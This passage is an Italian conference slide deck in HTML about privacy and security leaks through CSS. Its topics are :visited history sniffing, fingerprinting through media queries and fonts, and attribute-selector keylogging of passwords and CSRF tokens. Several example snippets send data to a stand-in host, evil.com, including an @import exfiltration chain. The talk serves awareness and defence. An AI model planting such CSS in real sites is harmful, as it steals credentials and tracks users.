@@ -1,0 +1,1071 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>CSS spies on us</title>
+  <base href="..">
+  <link rel="shortcut icon" href="img/ts.png" type="image/png">
+  <link rel="stylesheet" href="vendor/prismjs/themes/prism.css">
+  <link rel="stylesheet" href="css/main.css">
+  <link rel="stylesheet" href="css/print.css" media="print">
+  <link rel="stylesheet" href="css/presentation.css">
+</head>
+
+<body>
+  <p-deck>
+    <p-slide class="cover">
+  <h3>CSS ci spia</h3>
+  <h4>
+    Massimo Artizzu
+    <small>Web dev/architect, <a href="https://antreem.com/">Antreem</a></small>
+  </h4>
+</p-slide>
+<p-slide class="justify-start">
+  <img src="img/logo-antreem-border.svg" alt="Antreem logo" class="antreem-logo">
+  <div class="my-data">
+    <img src="img/maxart.jpg" alt="My face" class="my-face">
+    <h2>Massimo Artizzu</h2>
+    <p>
+      Web dev &amp; architect<br>
+      at <a href="https://antreem.com">Antreem</a>
+    </p>
+  </div>
+  <div class="my-info">
+    <h4>
+      <img src="img/twitter.svg" alt="Twitter logo"> /
+      <img src="img/github.svg" alt="GitHub logo"> /
+      <img src="img/dev-to.svg" alt="dev.to logo">
+      @MaxArt2501
+    </h4>
+  </div>
+</p-slide>
+<p-slide class="center">
+  <h3>Potete trovare le slide qui:</h3>
+  <img src="img/qr-slides.svg" alt="QR Code for the presentation's link" style="height: 7em; margin-bottom: 1em;">
+  <a
+    href="https://maxart2501.github.io/css-security-talk/css-day/">maxart2501.github.io/css-security-talk/css-day/</a>
+</p-slide>
+    <p-slide>
+  <h1 class="center">A che serve CSS?</h1>
+</p-slide>
+<p-slide>
+  <div class="two-columns">
+    <div class="center">
+      <h1 class="meme-text" style="margin-bottom: -1em;">HTML</h1>
+      <img src="img/ugly-car.jpg" alt="An ugly car, but still a car" style="max-width: 100%;">
+    </div>
+    <p-fragment class="center">
+      <h1 class="meme-text" style="margin-bottom: -1em;">HTML+CSS</h1>
+      <img src="img/beautiful-car.jpg" alt="An beautiful car, but still a car" style="max-width: 100%;">
+    </p-fragment>
+  </div>
+</p-slide>
+<p-slide class="justify-end">
+  <h1 class="meme-text center uppercase">CSS&hellip; un linguaggio?!</h1>
+  <img src="img/laugh.webp" alt="A man laughing" class="full-media">
+</p-slide>
+<p-slide class="align-center">
+  <h1 class="center">Eppure&hellip;</h1>
+</p-slide>
+<p-slide>
+  <h3 class="our-header">~2000</h3>
+  <div class="two-columns">
+    <div>
+      <a href="//nowhere.really">F.C. Barcelona</a><br>
+      <a href=".">Real Madrid C.F.</a><br>
+    </div>
+    <p-fragment class="big-x-wrapper">
+      <pre class="language-js"><code>function isVisited(a) {
+  return getComputedStyle(a).color
+    === 'rgb(85, 26, 139)';
+}</code></pre>
+      <p-fragment class="big-x"></p-fragment>
+    </p-fragment>
+  </div>
+  <p-notes>Non funziona più perché <code>getComputedStyle</code> ora restituisce sempre lo stile del link non visitato</p-notes>
+</p-slide>
+<p-slide>
+  <h3 class="our-header">2013</h3>
+  <div class="two-columns">
+    <div>
+      <pre class="language-css"><code>a:visited {
+  border-radius: 10% 20% 30% 40%;
+  box-shadow: 0 0 50em blue;
+  text-shadow: 0 0 50em red;
+  transform: skew(10deg 10deg);
+  filter: url('effect.svg#fx');
+}</code></pre>
+    </div>
+    <p-fragment class="big-x-wrapper">
+      <pre class="language-js"><code>function isVisited(a) {
+  return new Promise(resolve => {
+    const start = Date.now();
+    requestAnimationFrame(now => {
+      resolve(now - start > 17);
+    });
+  });
+}</code></pre>
+    </p-fragment>
+  </div>
+</p-slide>
+<p-slide>
+  <img src="img/wontfix.png" alt="Screenshot of Chrome Bugtracker marking the issue 'Visited links can be detected via redraw timing' as 'Won't fix'" class="full-media">
+</p-slide>
+<p-slide>
+  <img src="img/panic.gif" alt="Kermit panicking" class="full-media">
+</p-slide>
+<p-slide class="center">
+  <h1>Ma</h1>
+  <p-fragment>
+    <p>I browser sono sempre più veloci</p>
+  </p-fragment>
+  <p-fragment>
+    <p>👇</p>
+    <p>Exploit ormai inaffidabile</p>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <h3 class="center">Inoltre</h3>
+  <p-fragment class="center">
+    <p>possiamo stilizzare <code>:visited</code> solo con</p>
+  </p-fragment>
+  <p-fragment class="self-center">
+    <ul>
+      <li>👉 <code>color</code></li>
+      <li>👉 <code>background-color</code></li>
+      <li>👉 <code>border-color</code></li>
+      <li>👉 <code>outline-color</code></li>
+      <li>👉 <code>column-rule-color</code></li>
+      <li>👉 <code>fill</code>, <code>stroke</code> (solo per i colori)</li>
+    </ul>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <div class="padme-anakin">
+    <img src="img/visited-1.jpg" alt="Anakin: :visited fa acqua da tutte le parti">
+    <p-fragment>
+      <img src="img/visited-2.jpg" alt="Padme: Ma ormai l'hanno sistemato, giusto?">
+    </p-fragment>
+    <p-fragment style="grid-column-end: span 2;">
+      <img src="img/visited-3.jpg" alt="Anakin: Padme: L'hanno sistemato... giusto?">
+    </p-fragment>
+  </div>
+</p-slide>
+<p-slide class="center">
+  <h1>&Egrave; anche peggio</h1>
+  <p-fragment><h4>quando c'è di mezzo anche <span class="javascript">JavaScript</span></h4></p-fragment>
+  <p-fragment><br>L'URL di un link può essere cambiato<br><em>migliaia di volte al secondo</em></p-fragment>
+</p-slide>
+<p-slide>
+  <h3 class="our-header">Esempio: SVG complesso</h3>
+  <div class="two-columns">
+    <pre class="language-html"><code>&lt;a href="...">
+  &lt;svg>
+    &lt;filter id="fx">
+      ...
+    &lt;/filter>
+    &lt;path filter="url(#fx)" d="..."/>
+  &lt;/svg>
+&lt;/a></code></pre>
+    <div class="center">
+      <pre class="language-css"><code>a:visited { fill: currentColor; }</code></pre>
+      <br>
+      <img src="img/complex-svg.png" alt="Esempio di SVG complesso" style="height: 3em;">
+      <img src="img/complex-svg.png" alt="Esempio di SVG complesso, col colore dei link visitati" style="height: 3em; filter: hue-rotate(30deg);">
+    </div>
+  </div>
+</p-slide>
+<p-slide>
+  <h3 class="our-header">Esempio: trasformazioni 3D</h3>
+  <p-fragment>
+    <p>👉 Efficace soprattutto sul <span aria-label="mobile">📱</span></p><br>
+  </p-fragment>
+  <p-fragment>
+    <h3 class="our-header">Esempio: Ambient Light Sensor API</h3>
+    <p-fragment>
+      👉 La <em>luce del display</em> ci tradisce! 😱
+    </p-fragment>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <h3 class="our-header">Esempio: CSS Paint API</h3>
+  <p-fragment>
+    <p>👉 Fixato in <img src="img/chrome.svg" alt="Chrome logo" style="height: 1em;"> Chrome 67</p><br>
+  </p-fragment>
+  <p-fragment>
+    <h3 class="our-header">Esempio: transizioni di colore</h3>
+    <p-fragment>
+      👉 Fixato in <img src="img/chrome.svg" alt="Chrome logo" style="height: 1em;"> Chrome 92
+    </p-fragment>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <h3 class="center">&hellip; disabilitiamo <span class="javascript">JavaScript</span>?</h3>
+</p-slide>
+<p-slide>
+  <div class="two-columns align-center">
+    <h4 class="center">Si può <em>chiedere all'utente</em> quali siti ha visitato?</h4>
+    <div style="position: relative; font-size: 80%;">
+      <p-fragment style="display: block;">
+        <p>
+          Prego inserire i siti visitati:
+        </p>
+        <div style="border: .05em solid; height: 4em; padding: .25em">
+          https://www.you|
+        </div>
+      </p-fragment>
+      <p-fragment class="big-x"></p-fragment>
+    </div>
+  </div>
+</p-slide>
+<p-slide>
+  <div class="two-columns align-center">
+    <div>
+      <pre class="language-html"><code>&lt;a href="http://site1.com">&lt;/a>
+&lt;a href="http://site2.com">&lt;/a>
+&lt;a href="http://site3.com">&lt;/a>
+...</code></pre>
+      <pre class="language-css"><code>a:visited { background: black }</code></pre>
+    </div>
+    <div>
+      <div class="lcd-display">
+        <div></div>
+        <div class="on"></div>
+        <div class="on"></div>
+        <div class="on"></div>
+        <div class="on"></div>
+        <div class="on"></div>
+        <div></div>
+
+        <div class="on"></div>
+        <div></div>
+        <div class="on"></div>
+        <div class="on"></div>
+        <div class="on"></div>
+        <div></div>
+        <div class="on"></div>
+
+        <div class="on"></div>
+        <div class="on"></div>
+        <div class="on"></div>
+        <div></div>
+        <div class="on"></div>
+        <div class="on"></div>
+        <div class="on"></div>
+
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div class="on"></div>
+        <div class="on"></div>
+      </div>
+      <p>Inserire il numero sopra:</p>
+      <div style="border: .05em solid; padding: .25em">|</div>
+    </div>
+  </div>
+</p-slide>
+<p-slide>
+  <h3 class="center">E quindi&hellip;</h3>
+  <img src="img/visited-once-and-4all.png" alt="Chromium Issue 713521: Eliminate :visited privacy issues once and for all" style="height: 2em;">
+</p-slide>
+<p-slide>
+  <div class="two-columns align-center">
+    <span style="font-size: 400%; text-align: end;">⌚</span>
+    <div><em>Ridurre</em> i tempi per cui un link è considerato "visitato"</div>
+  </div>
+</p-slide>
+<p-slide>
+  <div class="two-columns align-center">
+    <span style="font-size: 400%; text-align: end;">🙅‍♀️</span>
+    <div>
+      <em>Limitare</em> lo stato "visitato" ai soli link <em>della stessa origine</em><br>
+      <p-fragment><small>(&hellip; Sì, ma Google?)</small></p-fragment>
+    </div>
+  </div>
+</p-slide>
+<p-slide>
+  <div class="two-columns align-center">
+    <span style="font-size: 400%; text-align: end;">👬</span>
+    <div><em>Limitare</em> lo stato "visitato" ai soli link <em>azionati da quella origine</em></div>
+  </div>
+</p-slide>
+<p-slide>
+  <img src="img/spilling.jpg" alt="Una condotta che fa acqua da tutte le parti" class="full-media">
+</p-slide>
+    <p-slide>
+  <h2 class="center">Ci stiamo solo scaldando&hellip;</h2>
+</p-slide>
+<p-slide class="center">
+  <h3>Parliamo di</h3>
+  <img src="img/fingerprint.svg" alt="Fingerprinting" style="height: 6em;">
+</p-slide>
+<p-slide class="center">
+  <h1>CSS</h1>
+  <h3>
+    <p-fragment>può fare richieste <em>non limitate</em> a suo piacimento</p-fragment>
+  </h3>
+</p-slide>
+<p-slide>
+  <img src="img/deal-with-it.gif" alt="Arrangiatevi" class="full-media">
+</p-slide>
+<p-slide class="justify-end">
+  <video src="img/break-the-internet.mp4" class="full-media" autoplay loop muted></video>
+  <h2 class="center uppercase meme-text">Si rompe l'internet</h2>
+</p-slide>
+<p-slide>
+  <pre class="self-center" style="font-size: 50%;">IP: 123.123.123.123
+
+GET http://evil.com/spy.css HTTP/1.1
+<b>Accept</b>: text/css,*/*;q=0.1
+<b>Accept-Encoding</b>: gzip, deflate, br
+<b>Accept-Language</b>: it-IT,it;q=0.9,en-XA;q=0.8,en;q=0.7,en-US;q=0.6
+<b>Cache-Control</b>: no-cache
+<b>DNT</b>: 1
+<b>Pragma</b>: no-cache
+<b>Host</b>: https://hello.com
+<b>User-agent</b>: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+  AppleWebKit/537.36 (KHTML, like Gecko)
+  Chrome/98.0.4758.102 Safari/537.36</pre>
+  <p-fragment>
+    <div class="sketchy-arrow" style="width: 3.5em;top: 14%;left: 37%;transform: rotate(-35deg);"></div>
+    <div style="position: absolute; top: 16%; left: 53%;">🌎</div>
+  </p-fragment>
+  <p-fragment>
+    <div class="sketchy-arrow" style="width: 3.5em;top: 30%;left: 60%;transform: rotate(-50deg);"></div>
+    <div style="position: absolute; top: 27%; left: 75%;">🌍</div>
+  </p-fragment>
+  <p-fragment>
+    <div class="sketchy-arrow" style="width: 3.5em;transform: rotate(-10deg);left: 65%;top: 70%;"></div>
+    <div style="position: absolute;top: 80%;left: 80%;">🏄‍♀️</div>
+  </p-fragment>
+  <p-fragment>
+    <div class="sketchy-arrow" style="width: 1.5em;transform: scale(-1, 1);top: 54%;left: 8%;"></div>
+    <div style="position: absolute;top: 60%;left: 3%;">🤣</div>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <h1 class="center">Browser sniffing</h1>
+  <p-fragment>
+    <h3 class="center">feat. CSS</h3>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <h3 class="our-header"><code>@supports</code></h3>
+  <p-fragment class="self-center">
+    <pre class="big language-css"><code>@supports (accent-color: red) {
+  .browser-sniff {
+    background-image: url(ch-93-ff-92-sf-15.4.png)
+  }
+}</code></pre>
+  </p-fragment>
+  <p-fragment>
+    <div class="sketchy-arrow" style="width: 3em;transform: scale(-1, 1);top: 30%;left: 38%;"></div>
+  </p-fragment>
+  <p-fragment>
+    <div class="sketchy-arrow" style="width: 3em;transform: scale(1, -1);top: 65%;left: 58%;"></div>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <table class="center">
+    <thead>
+      <tr>
+        <th style="border-bottom: .1em solid; padding: .5em;"><code>@supports</code></th>
+        <th style="border-bottom: .1em solid; padding: .5em;">Browser/OS</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><p-fragment><code>-webkit-app-region</code></p-fragment></td>
+        <td><p-fragment><img src="img/chrome.svg" alt="Chrome" style="height: 1.5em"></p-fragment></td>
+      </tr>
+      <tr>
+        <td><p-fragment><code>-apple-pay-button-style</code></p-fragment></td>
+        <td><p-fragment><img src="img/safari.svg" alt="Safari" style="height: 1.5em"></p-fragment></td>
+      </tr>
+      <tr>
+        <td><p-fragment><code>-webkit-touch-callout</code></p-fragment></td>
+        <td><p-fragment><img src="img/safari.svg" alt="Safari" style="height: 1.5em"><img src="img/iphone.svg" alt="Mobile" style="height: 1.5em"></p-fragment></td>
+      </tr>
+      <tr>
+        <td><p-fragment><code>-moz-appearance</code></p-fragment></td>
+        <td><p-fragment><img src="img/firefox.svg" alt="Firefox" style="height: 1.5em"></p-fragment></td>
+      </tr>
+      <tr>
+        <td><p-fragment><code>-moz-osx-font-smoothing</code></p-fragment></td>
+        <td><p-fragment><img src="img/firefox.svg" alt="Firefox" style="height: 1.5em"><img src="img/apple.svg" alt="Apple" style="height: 1.5em"></p-fragment></td>
+      </tr>
+    </tbody>
+  </table>
+</p-slide>
+<p-slide>
+  <div class="two-columns align-center">
+    <img src="img/web-compat-caniuse.png" alt="Tabella di compatibilità da Can I Use">
+    <img src="img/web-compat-mdn.png" alt="Tabella di compatibilità da MDN">
+  </div>
+</p-slide>
+<p-slide class="center">
+  <h1>Non pensiate</h1>
+  <p-fragment>che i browser più vecchi <em>non siano interessanti</em></p-fragment>
+</p-slide>
+<p-slide>
+  <h3 class="our-header"><code>@media</code> queries</h3>
+  <p-fragment class="self-center">
+    <pre class="language-css big"><code>@media (max-width: 459px) {
+  .device-sniff {
+    background-image: url(//evil.com/mobile.png);
+  }
+}
+@media (min-width: 460px) and (max-width: 999px) {
+...</code></pre>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <video src="img/jenga-fail.mp4" class="full-media" autoplay muted loop></video>
+</p-slide>
+<p-slide>
+  <pre class="language-css self-center big"><code>@media (pointer: coarse) {
+  .device-sniff {
+    background-image: url(//evil.com/mobile.png);
+  }}
+@media (pointer: fine) {
+  .device-sniff {
+    background-image: url(//evil.com/desktop.png);
+  }}</code></pre>
+  <p-fragment class="landing" style="top: 30%; right: 5%;"><div style="font-size: 2.5em; transform: rotate(20deg);">📱</div></p-fragment>
+  <p-fragment class="landing" style="top: 60%; right: 5%;"><div style="font-size: 2.5em; transform: rotate(20deg);">💻</div></p-fragment>
+</p-slide>
+<p-slide>
+  <pre class="language-css self-center big"><code>@media (prefers-color-scheme: dark) {
+  .device-sniff {
+    background-image: url(//evil.com/nerd.png);
+  }}
+@media (color-gamut: p3) {
+  .device-sniff {
+    background-image: url(//evil.com/apple.png);
+  }}</code></pre>
+  <p-fragment class="landing" style="top: 30%; right: 5%;"><div style="font-size: 2.5em; transform: rotate(20deg);">🤓</div></p-fragment>
+  <p-fragment class="landing" style="top: 60%; right: 5%;"><div style="font-size: 2.5em; transform: rotate(20deg);">🍎</div></p-fragment>
+</p-slide>
+<p-slide>
+  <pre class="language-css self-center big"><code>@media (dynamic-range: high) {
+  .device-sniff {
+    background-image: url(//evil.com/hdr.png);
+  }}
+@media (scripting: none) {
+  .device-sniff {
+    background-image: url(//evil.com/no-js.png);
+  }}</code></pre>
+  <p-fragment class="landing" style="top: 30%; right: 5%;"><div style="font-size: 2.5em; transform: rotate(20deg);">🐟</div></p-fragment>
+  <p-fragment class="landing" style="top: 60%; right: 5%;"><div style="font-size: 2.5em; transform: rotate(20deg);">❌</div></p-fragment>
+</p-slide>
+<p-slide>
+  <ul class="self-center">
+    <li>
+      <img src="img/fingerprint.svg" role="presentation" style="height: 1em; vertical-align: middle;"> device
+    </li>
+    <li>
+      <p-fragment><img src="img/fingerprint.svg" role="presentation" style="height: 1em; vertical-align: middle;"> OS</p-fragment>
+    </li>
+    <li>
+      <p-fragment><img src="img/fingerprint.svg" role="presentation" style="height: 1em; vertical-align: middle;"> browser</p-fragment>
+    </li>
+    <li>
+      <p-fragment><img src="img/fingerprint.svg" role="presentation" style="height: 1em; vertical-align: middle;"> lingua</p-fragment>
+    </li>
+    <li>
+      <p-fragment><img src="img/fingerprint.svg" role="presentation" style="height: 1em; vertical-align: middle;"> preferenze</p-fragment>
+    </li>
+  </ul>
+  <p-fragment>
+    <h2 class="center" style="margin-top: 1em;">Basta?</h2>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <pre class="language-css self-center big"><code>@font-face {
+  font-family: Helvetica Neue;
+  src: local('Helvetica Neue')</code>
+    <p-fragment><code>url(http://evil.com/not-apple.ttf) format('ttf');</code></p-fragment>
+}</code></pre>
+</p-slide>
+<p-slide class="center">
+  <table>
+    <thead>
+      <tr>
+        <th style="border-bottom: .1em solid; padding: .5em;">Font</th>
+        <th style="border-bottom: .1em solid; padding: .5em;">OS</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Helvetica Neue, San Francisco</td>
+        <td><img src="img/apple.svg" alt="Apple" style="height: 1.5em"></td>
+      </tr>
+      <tr>
+        <td>Segoe UI, Tahoma</td>
+        <td><img src="img/windows.svg" alt="Windows" style="height: 1.5em"></td>
+      </tr>
+      <tr>
+        <td>Roboto, Droid Sans</td>
+        <td><img src="img/android.svg" alt="Android" style="height: 1.5em"></td>
+      </tr>
+      <tr>
+        <td>Ubuntu, Liberation Sans</td>
+        <td><img src="img/linux.svg" alt="Linux" style="height: 1.5em"></td>
+      </tr>
+      <tr>
+        <td>Arimo</td>
+        <td><img src="img/chrome.svg" alt="Chrome OS" style="height: 1.5em"></td>
+      </tr>
+    </tbody>
+  </table>
+</p-slide>
+<p-slide class="center">
+  <table>
+    <thead>
+      <tr>
+        <th style="border-bottom: .1em solid; padding: .5em;">Font</th>
+        <th style="border-bottom: .1em solid; padding: .5em;">Produttore</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Gothic Bold</td>
+        <td><img src="img/samsung.svg" alt="Logo Samsung" style="height: 1.5em;"></td>
+      </tr>
+      <tr>
+        <td>ChakraPetch</td>
+        <td><img src="img/xiaomi.svg" alt="Logo Xiaomi" style="height: 1.5em;"></td>
+      </tr>
+      <tr>
+        <td>OnePlus Sans</td>
+        <td><img src="img/oneplus.svg" alt="Logo OnePlus" style="height: 1.5em;"></td>
+      </tr>
+      <tr>
+        <td>LG Smart</td>
+        <td><img src="img/lg.svg" alt="Logo LG" style="height: 1.5em;"></td>
+      </tr>
+      <tr>
+        <td>Furious Hello</td>
+        <td><img src="img/oppo.svg" alt="Logo Oppo" style="height: 1.5em;"></td>
+      </tr>
+    </tbody>
+  </table>
+</p-slide>
+<p-slide class="center">
+  <img src="img/input-type-file-fr.png" alt="input type='file' in francese" style="height: 1.5em;">
+  <img src="img/input-type-file-kr.png" alt="input type='file' in coreano" style="height: 1.5em; margin-bottom: 2em;">
+  <p-fragment class="self-center"><pre class="language-html big"><code>&lt;input type="file"></code></pre></p-fragment>
+</p-slide>
+<p-slide>
+  <pre class="language-css self-center"><code>input[type="file"] { font-family: EvilSniff; }</code>
+
+<p-fragment><code>@font-face {
+  font-family: EvilSniff;
+  src: url(http://evil.com/fr.woff) format('woff');
+  unicode-range: U+00e9;
+}
+@font-face {
+  font-family: EvilSniff;
+  src: url(http://evil.com/kr.woff) format('woff');
+  unicode-range: U+c120;
+}
+...</code></p-fragment></pre>
+  <p-fragment>
+    <div class="sketchy-arrow" style="width: 2em; top: 43%; left: 46%; transform: scale(1, -1) rotate(-30deg);"></div>
+    <span style="position: absolute; top: 41%; left: 55%;">é &rArr; 🇫🇷</span>
+  </p-fragment>
+  <p-fragment>
+    <div class="sketchy-arrow" style="width: 2em; top: 70%; left: 46%; transform: scale(1, -1) rotate(-30deg);"></div>
+    <span style="position: absolute; top: 68%; left: 55%;">선 &rArr; 🇰🇷</span>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <h3 class="our-header">Ulteriore traccia: font popolari</h3>
+  <ul class="center">
+    <li><img src="img/montserrat.png" alt="Esempio di font Montserrat" style="height: 1em;"></li>
+    <li><img src="img/open-sans.png" alt="Esempio di font Open-sans" style="height: 1em;"></li>
+    <li><img src="img/lato.png" alt="Esempio di font Lato" style="height: 1em;"></li>
+    <li><img src="img/raleway.png" alt="Esempio di font Raleway" style="height: 1em;"></li>
+    <li><img src="img/oswald.png" alt="Esempio di font Oswald" style="height: 1em;"></li>
+  </ul>
+</p-slide>
+<p-slide style="--slide-bg: #8d9091">
+  <img src="img/open-book.gif" class="full-media" alt="Come un libro aperto">
+</p-slide>
+    <p-slide>
+  <h2 class="center">&hellip; può andare peggio?</h2>
+</p-slide>
+<p-slide class="center">
+  <img src="img/react.svg" alt="React.js" style="height: 4em;">
+  <p-fragment>sincronizza attributo e proprietà <code>value</code></p-fragment>
+  <p-fragment><h3>degli elementi <code>&lt;input></code></h3></p-fragment>
+  <p-fragment><h2>anche <code>type="password"</code></h2></p-fragment>
+</p-slide>
+<p-slide>
+  <pre class="language-jsx self-center"><code>import { useState } from 'react';
+
+export default function UserPassword() {
+  const [pwd, setPwd] = useState('');
+  return &lt;label>Password:
+    &lt;input type="password" value={pwd}
+      onChange={e => setPwd(e.target.value)}
+    />
+  &lt;/label>;
+}</code></pre>
+</p-slide>
+<p-slide>
+  <img src="img/whatever.gif" alt="Whatever" class="full-media">
+</p-slide>
+<p-slide>
+<pre class="language-css self-center"><code>input[type='password'][value$='a']::before {
+  content: url('http://evil.com/a.gif');
+}
+input[type='password'][value$='b']::before {
+  content: url('http://evil.com/b.gif');
+}
+input[type='password'][value$='c']::before {
+  content: url('http://evil.com/c.gif');
+}
+...</code></pre>
+</p-slide>
+<p-slide>
+  <img src="img/really.gif" alt="Really?" class="full-media">
+</p-slide>
+<p-slide class="center">
+  <h1>Abbiamo la <em>certezza</em> di sapere da dove arrivano i nostri fogli di stile?</h1>
+</p-slide>
+<p-slide class="justify-end">
+  <img src="img/pfft-duh.gif" alt="Pfft, duh!" class="full-media">
+  <h2 class="meme-text center uppercase">Beh ovvio!</h2>
+</p-slide>
+<p-slide>
+  <h1 class="center">Potreste non essere stati <em>voi</em> ad essere attaccati</h1>
+</p-slide>
+<p-slide>
+  <h4 class="our-header">Script esterni nelle nostre pagine</h4>
+  <ul class="self-center">
+    <li><p-fragment>👉 profilazione</p-fragment></li>
+    <li><p-fragment>👉 pubblicità</p-fragment></li>
+    <li><p-fragment>👉 social</p-fragment></li>
+    <li><p-fragment>👉 video</p-fragment></li>
+    <li><p-fragment>👉 widget</p-fragment></li>
+  </ul>
+</p-slide>
+<p-slide class="center">
+  <h1>Avete idea</h1>
+  <h3>di quanti pacchetti sono dipendenze del vostro progetto?</h3>
+</p-slide>
+<p-slide class="center">
+  <h1>429</h1>
+  <p-fragment>solo per questa presentazione</p-fragment>
+  <p-fragment><small>senza includere i plugin di PrismJS</small></p-fragment>
+</p-slide>
+<p-slide>
+  <img src="img/my-gosh.gif" alt="Robert Downey Jr. spalanca gli occhi" class="full-media">
+</p-slide>
+<p-slide class="center">
+  <img src="img/node_modules_meme.png" alt="Classico meme sul 'peso' di node_modules_meme" style="height: 12em;">
+</p-slide>
+<p-slide>
+  <svg class="full-media" viewBox="0 2.5 160 90"><g fill="#0f0" stroke="currentColor"><path d="m35 35 22.5 25M57.5 35v25M80 35 57.5 60M105 35l15 25M120 35v25M135 35l-15 25M57.5 60 90 85M120 60 90 85M10 10l25 25M20 10l15 25M30 10l5 25M40 10l-5 25M50 10 35 35M60 10 35 35"/><circle cx="10" cy="10" r="3"/><circle cx="20" cy="10" r="3"/><circle cx="30" cy="10" r="3"/><circle cx="40" cy="10" r="3"/><circle cx="50" cy="10" r="3"/><circle cx="60" cy="10" r="3"/><circle cx="35" cy="35" r="3"/><circle cx="57.5" cy="35" r="3"/><path d="m70 10 10 25M80 10v25M90 10 80 35"/><circle cx="70" cy="10" r="3"/><circle cx="80" cy="10" r="3"/><circle cx="90" cy="10" r="3"/><circle cx="80" cy="35" r="3"/><path d="m100 10 5 25M110 10l-5 25"/><circle cx="100" cy="10" r="3"/><circle cx="110" cy="10" r="3"/><circle cx="105" cy="35" r="3"/><circle cx="120" cy="35" r="3"/><path d="m120 10 15 25M130 10l5 25M140 10l-5 25M150 10l-15 25"/><circle cx="120" cy="10" r="3"/><circle cx="130" cy="10" r="3"/><circle cx="140" cy="10" r="3"/><circle cx="150" cy="10" r="3"/><circle cx="135" cy="35" r="3"/><circle cx="57.5" cy="60" r="3"/><circle cx="120" cy="60" r="3"/><circle cx="90" cy="85" r="3"/></g></svg>
+  <p-fragment>
+    <svg class="full-media" viewBox="0 2.5 160 90"><g fill="#0f0" stroke="currentColor"><path d="m35 35 22.5 25M57.5 35v25M80 35 57.5 60M105 35l15 25M120 35v25M135 35l-15 25M57.5 60 90 85M120 60 90 85M10 10l25 25M20 10l15 25M30 10l5 25M40 10l-5 25M50 10 35 35M60 10 35 35"/><circle cx="10" cy="10" r="3"/><circle cx="20" cy="10" r="3"/><circle cx="30" cy="10" r="3"/><circle cx="40" cy="10" r="3"/><circle cx="50" cy="10" r="3"/><circle cx="60" cy="10" r="3"/><circle cx="35" cy="35" r="3"/><circle cx="57.5" cy="35" r="3"/><path d="m70 10 10 25M80 10v25M90 10 80 35"/><circle cx="70" cy="10" r="3" fill="red"/><circle cx="80" cy="10" r="3"/><circle cx="90" cy="10" r="3"/><circle cx="80" cy="35" r="3" fill="red"/><path d="m100 10 5 25M110 10l-5 25"/><circle cx="100" cy="10" r="3"/><circle cx="110" cy="10" r="3"/><circle cx="105" cy="35" r="3"/><circle cx="120" cy="35" r="3"/><path d="m120 10 15 25M130 10l5 25M140 10l-5 25M150 10l-15 25"/><circle cx="120" cy="10" r="3"/><circle cx="130" cy="10" r="3"/><circle cx="140" cy="10" r="3"/><circle cx="150" cy="10" r="3"/><circle cx="135" cy="35" r="3"/><circle cx="57.5" cy="60" r="3" fill="red"/><circle cx="120" cy="60" r="3"/><circle cx="90" cy="85" r="3" fill="red"/></g></svg>
+  </p-fragment>
+</p-slide>
+<p-slide style="--slide-bg: #2b0513;">
+  <img src="img/fingers-crossed.gif" alt="Dita incrociate" class="full-media">
+</p-slide>
+<p-slide class="center">
+  <h1>E per giunta&hellip;</h1>
+  <p-fragment><img src="img/stylus.png" alt="Logo dell'estensione Stylus" style="height: 4em;"></p-fragment>
+</p-slide>
+<p-slide style="--slide-bg: #1d4f76" class="justify-end">
+  <h1 class="center meme-text uppercase">Hackers be like</h1>
+  <img src="img/thumbs-up.gif" alt="Persona che fa il pollice su" class="full-media">
+</p-slide>
+<p-slide>
+  <h3 class="our-header">Anche senza React&hellip;</h3>
+  <div class="self-center">
+    <pre class="language-html"><code>&lt;input type="hidden" name="csrf" value="abcdef=="></code></pre>
+    <pre class="language-css"><code>input[name="csrf"][value^="a"] ~ * {
+  background-image: url('http://evil.com/a.gif');
+}
+...
+input[name="csrf"][value$="="] ~ * {
+  background-image: url('http://evil.com/is-base-64.gif');
+}
+...</code></pre>
+  </div>
+</p-slide>
+<p-slide>
+  <h4 class="our-header">Hidden input per ultimi? No problem!</h4>
+  <pre class="language-css self-center"><code>form:has(input[name="csrf"][value^="a"]) {
+  background-image: url('http://evil.com/a.gif');
+}
+...
+form:has(input[name="csrf"][value$="="]) {
+  background-image: url('http://evil.com/is-base-64.gif');
+}
+...</code></pre>
+</p-slide>
+<p-slide>
+  <h4 class="center">Sono solo un paio di byte&hellip; 🤷‍♀️</h4>
+  <p-fragment>
+    <h2 class="center">&hellip; oppure no? 😨</h2>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <div class="two-columns align-center">
+    <pre class="language-css"><code>@import url(//evil.com/exfil?l=0);
+@import url(//evil.com/exfil?l=1);
+@import url(//evil.com/exfil?l=2);
+@import url(//evil.com/exfil?l=3);
+@import url(//evil.com/exfil?l=4);
+@import url(//evil.com/exfil?l=5);
+@import url(//evil.com/exfil?l=6);
+@import url(//evil.com/exfil?l=7);
+@import url(//evil.com/exfil?l=8);
+@import url(//evil.com/exfil?l=9);
+@import url(//evil.com/exfil?l=10);
+...</code></pre>
+    <p-fragment><video src="img/exfil.webm" alt="Clip di un log di rete durante esfiltrazione di dati" style="width: 100%;" autoplay loop muted></p-fragment>
+  </div>
+</p-slide>
+<p-slide>
+  <h4 class="center">Non sono solo gli <code>&lt;input></code>&hellip;</h4>
+  <p-fragment>
+    <h2 class="center">&hellip; me <em>ogni</em> contenuto visibile di una <em>qualsiasi</em> pagina può essere estratto da un CSS malevolo.</h2>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <div class="two-columns align-center">
+    <div>
+      <div>Salve, <b>Mario Rossi</b></div>
